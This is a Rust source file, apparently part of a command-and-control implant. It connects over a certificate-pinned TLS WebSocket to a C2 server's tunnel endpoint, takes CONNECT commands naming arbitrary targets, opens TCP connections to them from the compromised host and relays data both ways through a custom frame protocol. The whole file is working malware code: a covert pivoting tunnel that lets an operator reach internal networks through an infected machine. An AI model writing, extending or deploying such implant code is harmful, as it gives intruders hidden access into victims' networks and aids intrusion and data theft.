// implant/src/tunnel_client.rs
// Connects WSS to /c2/tunnel/{type}/{session_id}, relays TCP↔WS.
// Frame: [1-byte cmd][4-byte conn_id BE][N-byte payload]
// 0x01 CONNECT 0x02 DATA 0x03 CLOSE 0x04 CONNECTED 0x05 ERROR

use anyhow::Result;
use futures_util::{SinkExt, StreamExt};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, Mutex};
use tokio_tungstenite::{connect_async_tls_with_config, tungstenite::Message, Connector};

use crate::config::Config;
use crate::transport::tls::PinnedCertVerifier;

const CMD_CONNECT: u8 = 0x01;
const CMD_DATA: u8 = 0x02;
const CMD_CLOSE: u8 = 0x03;
const CMD_CONNECTED: u8 = 0x04;
const CMD_ERROR: u8 = 0x05;

fn enc(cmd: u8, conn_id: u32, payload: &[u8]) -> Vec<u8> {
    let mut out = vec![cmd];
    out.extend_from_slice(&conn_id.to_be_bytes());
    out.extend_from_slice(payload);
    out
}

fn dec(data: &[u8]) -> Result<(u8, u32, &[u8])> {
    anyhow::ensure!(data.len() >= 5, "frame too short");
    Ok((
        data[0],
        u32::from_be_bytes(data[1..5].try_into().unwrap()),
        &data[5..],
    ))
}

type ConnMap = Arc<Mutex<HashMap<u32, mpsc::Sender<Vec<u8>>>>>;

pub async fn run_tunnel(config: &Config, tunnel_type: &str, session_id: &str) -> Result<()> {
    let url = format!(
        "wss://{}:{}/c2/tunnel/{}/{}",
        config.host, config.port, tunnel_type, session_id
    );
    let verifier = Arc::new(PinnedCertVerifier {
        expected_hash: config.cert_hash,
    });
    let rustls_cfg = Arc::new(
        rustls::ClientConfig::builder_with_protocol_versions(&[&rustls::version::TLS13])
            .dangerous()
            .with_custom_certificate_verifier(verifier)
            .with_no_client_auth(),
    );
    let (ws, _) =
        connect_async_tls_with_config(&url, None, false, Some(Connector::Rustls(rustls_cfg)))
            .await
            .map_err(|e| anyhow::anyhow!("WS connect: {e}"))?;

    let (ws_sink, ws_stream) = ws.split();
    let conn_map: ConnMap = Arc::new(Mutex::new(HashMap::new()));
    let (out_tx, mut out_rx) = mpsc::channel::<Vec<u8>>(256);

    // WS writer task
    tokio::spawn(async move {
        let mut sink = ws_sink;
        while let Some(f) = out_rx.recv().await {
            if sink.send(Message::Binary(f)).await.is_err() {
                break;
            }
        }
    });

    let mut stream = ws_stream;
    loop {
        let msg = match stream.next().await {
            Some(Ok(m)) => m,
            _ => break,
        };
        let bytes = match msg {
            Message::Binary(b) => b,
            Message::Close(_) => break,
            _ => continue,
        };
        let (cmd, conn_id, payload) = match dec(&bytes) {
            Ok(t) => t,
            Err(e) => {
                crate::dbg_log!("[!] {e}");
                continue;
            }
        };

        match cmd {
            CMD_CONNECT => {
                let target = String::from_utf8_lossy(payload).trim().to_string();
                let out = out_tx.clone();
                let map = Arc::clone(&conn_map);
                tokio::spawn(async move {
                    match TcpStream::connect(&target).await {
                        Ok(tcp) => {
                            let (dtx, drx) = mpsc::channel::<Vec<u8>>(64);
                            map.lock().await.insert(conn_id, dtx);
                            let _ = out.send(enc(CMD_CONNECTED, conn_id, b"")).await;
                            relay_tcp(tcp, conn_id, drx, out.clone()).await;
                            map.lock().await.remove(&conn_id);
                            let _ = out.send(enc(CMD_CLOSE, conn_id, b"")).await;
                        }
                        Err(e) => {
                            let _ = out
                                .send(enc(CMD_ERROR, conn_id, e.to_string().as_bytes()))
                                .await;
                        }
                    }
                });
            }
            CMD_DATA => {
                if let Some(tx) = conn_map.lock().await.get(&conn_id) {
                    let _ = tx.send(payload.to_vec()).await;
                }
            }
            CMD_CLOSE => {
                conn_map.lock().await.remove(&conn_id);
            }
            _ => {}
        }
    }
    Ok(())
}

async fn relay_tcp(
    mut tcp: TcpStream,
    conn_id: u32,
    mut drx: mpsc::Receiver<Vec<u8>>,
    out: mpsc::Sender<Vec<u8>>,
) {
    let (mut r, mut w) = tcp.split();
    let mut buf = vec![0u8; 4096];
    loop {
        tokio::select! {
            n = r.read(&mut buf) => match n {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    if out.send(enc(CMD_DATA, conn_id, &buf[..n])).await.is_err() {
                        break;
                    }
                }
            },
            msg = drx.recv() => match msg {
                None => break,
                Some(d) => {
                    if w.write_all(&d).await.is_err() {
                        break;
                    }
                }
            },
        }
    }
}
